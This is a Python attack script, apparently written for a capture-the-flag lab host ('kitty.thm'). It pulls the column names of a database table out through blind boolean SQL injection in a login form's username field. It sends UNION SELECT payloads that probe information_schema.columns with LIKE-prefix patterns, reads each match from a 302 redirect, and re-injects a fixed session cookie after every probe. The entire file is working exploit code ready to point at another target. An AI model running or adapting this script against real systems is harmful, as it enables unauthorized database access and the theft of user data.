#!/usr/bin/env python3
# enum_columns.py
# Enumerate column names in a given table using blind "LIKE 'prefix%'" probes.
# Assumes: POST /index.php with username payload triggers 302 on match, 200 otherwise.
# Sleeps 0.3s between requests and performs GET /logout.php after each probe and reinjects fixed PHPSESSID.

import requests
import time
import sys
from urllib.parse import urljoin
from requests.exceptions import RequestException

# ================ CONFIG ================
TARGET_URL = "http://kitty.thm/index.php"   # POST endpoint (full URL)
COOKIE_VALUE = "t4ic0s1fnma6j8pjobipfbucgf" # fixed PHPSESSID
DATABASE_NAME = "mywebsite"                 # target DB
TABLE_NAME = "siteusers"                    # target table
PASSWORD = "aaa"                            # form password
LOGOUT_PATH = "/logout.php"                 # logout GET path (same host)
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-$ABCDEFGHIJKLMNOPQRSTUVWXYZ"
SLEEP_BETWEEN = 0.3     # seconds between requests (as requested)
MAX_NAME_LEN = 64       # safety cap for column name length
MAX_COLUMNS = 200       # maximum number of columns to attempt
ALLOW_REDIRECTS_FOR_LOGOUT = True
CHECK_LOCATION_FOR_WELCOME = False  # set True to also require welcome.php in Location
# ========================================

HEADERS = {
    "User-Agent": "Mozilla/5.0 (enum-columns-script)",
    "Content-Type": "application/x-www-form-urlencoded",
}

# Template: we select a single column_name from information_schema.columns with LIMIT idx,1
USERNAME_TEMPLATE = (
    "a' UNION SELECT 1,2,3,4 WHERE "
    "(SELECT column_name FROM information_schema.columns "
    "WHERE table_schema='{db}' AND table_name='{table}' LIMIT {idx},1) LIKE '{pattern}';-- -"
)

session = requests.Session()
session.headers.update(HEADERS)
session.cookies.set("PHPSESSID", COOKIE_VALUE)

def get_logout_url(target, logout_path):
    return urljoin(target, logout_path)

LOGOUT_URL = get_logout_url(TARGET_URL, LOGOUT_PATH)

def reset_session_cookie():
    # re-inject the fixed PHPSESSID after logout
    session.cookies.set("PHPSESSID", COOKIE_VALUE)

def send_probe_for_pattern(db, table, col_index, pattern):
    """
    Send single POST probing whether the column_name at LIMIT col_index matches 'pattern'
    pattern should include trailing % when desired (e.g. 'user%')
    Returns True if response indicates a match (302), False otherwise.
    Always attempts logout GET afterwards and re-injects PHPSESSID.
    """
    payload_username = USERNAME_TEMPLATE.format(db=db, table=table, idx=col_index, pattern=pattern)
    data = {
        "username": payload_username,
        "password": PASSWORD
    }
    tries = 3
    for attempt in range(tries):
        try:
            resp = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=12)
            is_match = (resp.status_code == 302)
            if CHECK_LOCATION_FOR_WELCOME:
                is_match = is_match and ('welcome.php' in resp.headers.get('Location',''))
            # perform logout (best-effort)
            try:
                session.get(LOGOUT_URL, allow_redirects=ALLOW_REDIRECTS_FOR_LOGOUT, timeout=8)
            except RequestException as e:
                print(f"[!] Logout GET failed (ignored): {e}", file=sys.stderr)
            # reinstate fixed PHPSESSID for next probe
            reset_session_cookie()
            return is_match
        except RequestException as e:
            print(f"[!] Network error on attempt {attempt+1}: {e}", file=sys.stderr)
            time.sleep(1)
    raise RuntimeError("Network failure: all retries failed")

def enumerate_single_column_name(db, table, col_index):
    """
    Enumerate one column name (LIMIT col_index,1).
    Returns the column name string, or None if no column exists at that index.
    """
    name = ""
    for pos in range(1, MAX_NAME_LEN + 1):
        found = False
        for ch in CHARSET:
            pattern = f"{name + ch}%"
            try:
                match = send_probe_for_pattern(db, table, col_index, pattern)
            except RuntimeError:
                print("[!] Network problems, aborting enumeration.", file=sys.stderr)
                return None
            if match:
                name += ch
                print(f"[+] column[{col_index}] char #{pos}: '{ch}' -> so far: '{name}'")
                found = True
                time.sleep(SLEEP_BETWEEN)
                break
            else:
                time.sleep(SLEEP_BETWEEN)
        if not found:
            if pos == 1:
                # no first character -> likely no column at this index
                return None
            # otherwise end of name
            break
    return name

def enumerate_all_columns(db, table):
    cols = []
    print(f"[*] Starting column enumeration for {db}.{table}")
    print(f"[*] Target POST: {TARGET_URL}")
    print(f"[*] Logout URL: {LOGOUT_URL}")
    for idx in range(0, MAX_COLUMNS):
        print(f"[*] Enumerating column at index {idx} ...")
        col = enumerate_single_column_name(db, table, idx)
        if col is None:
            print(f"[*] No column found at index {idx}. Assuming enumeration finished.")
            break
        print(f"[+] Found column #{len(cols)} at index {idx}: {col}")
        cols.append(col)
    print("[*] Enumeration complete. Columns found:")
    for i, c in enumerate(cols):
        print(f"  {i}: {c}")
    return cols

if __name__ == "__main__":
    try:
        enumerate_all_columns(DATABASE_NAME, TABLE_NAME)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user", file=sys.stderr)
        sys.exit(1)
